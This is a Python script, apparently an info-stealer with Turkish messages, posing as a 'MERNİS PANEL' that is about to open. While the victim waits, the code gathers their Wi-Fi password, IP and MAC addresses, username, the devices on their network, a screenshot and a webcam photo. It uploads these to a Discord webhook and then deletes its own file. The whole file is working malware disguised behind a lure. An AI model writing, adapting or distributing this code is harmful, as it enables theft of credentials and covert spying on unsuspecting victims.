import socket
import os
import requests
from PIL import ImageGrab
from io import BytesIO
import subprocess
import uuid
import cv2
from colorama import Style, Fore
import shutil
import time

dizin = os.getcwd()

banner = f"""
{Fore.RED}_________________________
  ⢠⣶⣿⣿⣗⡢⠀⠀⠀⠀⠀⠀⢤⣒⣿⣿⣷⣆⠀⠀
⠀⠋⠉⠉⠙⠻⣿⣷⡄⠀⠀⠀⣴⣿⠿⠛⠉⠉⠉⠃⠀
⠀⠀⢀⡠⢤⣠⣀⡹⡄⠀⠀⠀⡞⣁⣤⣠⠤⡀⠀⠀⠀
⢐⡤⢾⣿⣿⢿⣿⡿⠀⠀⠀⠀⠸⣿⣿⢿⣿⣾⠦⣌⠀
⠁⠀⠀⠀⠉⠈⠀⠀⣸⠀⠀⢰⡀⠀⠈⠈⠀⠀⠀⠀⠁
⠀⠀⠀⠀⠀⠀⣀⡔⢹⠀⠀⢸⠳⡄⡀⠀⠀⠀⠀⠀⠀
⠸⡦⣤⠤⠒⠋⠘⢠⡸⣀⣀⡸⣠⠘⠉⠓⠠⣤⢤⡞⠀
⠀⢹⡜⢷⣄⠀⣀⣀⣾⡶⢶⣷⣄⣀⡀⢀⣴⢏⡾⠁⠀
⠀⠀⠹⡮⡛⠛⠛⠻⠿⠥⠤⠽⠿⠛⠛⠛⣣⡾⠁⠀⠀
⠀⠀⠀⠙⢄⠁⠀⠀⠀⣄⣀⡄⠀⠀⠀⢁⠞⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠂⠀⠀⠀⢸⣿⠀⠀⠀⠠⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-----------------------------------------------------------------------------
MERNİS PANEL 10 SANİYE SONRA AÇILACAKTIR LÜTFEN BU PENCEREYİ KAPATMAYINIZ....
-----------------------------------------------------------------------------
{Style.RESET_ALL}
"""

print(banner)

hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)

admin_user = os.popen('whoami').read().split('\\')[-1].strip()

ip = requests.get('https://api64.ipify.org').text

mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 2)][::-1])

modem_name = subprocess.run('netsh wlan show interfaces | findstr /r "^....SSID"', capture_output=True, text=True, shell=True).stdout.strip().split(':')[1].strip()

network_name = os.popen("netsh wlan show interfaces").read()

modem_password = subprocess.run(f'netsh wlan show profile name="{modem_name}" key=clear | findstr /r "Key Content"', capture_output=True, text=True, shell=True).stdout.strip().split(':')[1].strip()

screenshot = ImageGrab.grab()

cap = cv2.VideoCapture(0)

ret, frame = cap.read()
if ret:
    _, img_encoded = cv2.imencode(".png", frame)
    webcam_bytes = img_encoded.tobytes()
else:
    webcam_bytes = b""

buffered = BytesIO()
screenshot.save(buffered, format="PNG")
screenshot_bytes = buffered.getvalue()

connected_devices = subprocess.check_output(['arp', '-a']).decode('utf-8')

# İstek içeriğini 2000 karakterle sınırla
content = f"""
Modem IP Adresi: {ip_address}
Admin Kullanıcı: {admin_user}
Wifi Şifresi: {modem_password}
Wifi Adı: {modem_name}
İP Adresi: {ip}
Bilgisayar MAC Adresi: {mac}
Wifi Bilgileri: {network_name}
Wifiye Bağlı Cihazlar: {connected_devices}
Klasör Dizini: {dizin}
"""

# İçeriği 2000 karakterle sınırla
content_shortened = content[:2000]

# Discord Webhook URL'sini buraya ekleyin
webhook_url = "WebHook"

data = {
    "content": f"{content_shortened}"
}

files = {
    "screenshot.png": screenshot_bytes,
    "webcam.png": webcam_bytes if webcam_bytes else b""
}

response = requests.post(webhook_url, data=data, files=files)

if response.status_code == 204:
    print("İstek başarıyla gönderildi.")
else:
    print(f"İstek gönderilirken bir hata oluştu. Hata Kodu: {response.status_code}, Server Response: {response.text}")

time.sleep(5)

    

folder_name = dizin + "\\main.py"

try:
    os.remove(folder_name)
    print(f"Klasör '{folder_name}' başarıyla silindi.")
except Exception as e:
        print(f"Hata oluştu: {e}")


print("İşlem Başarılı")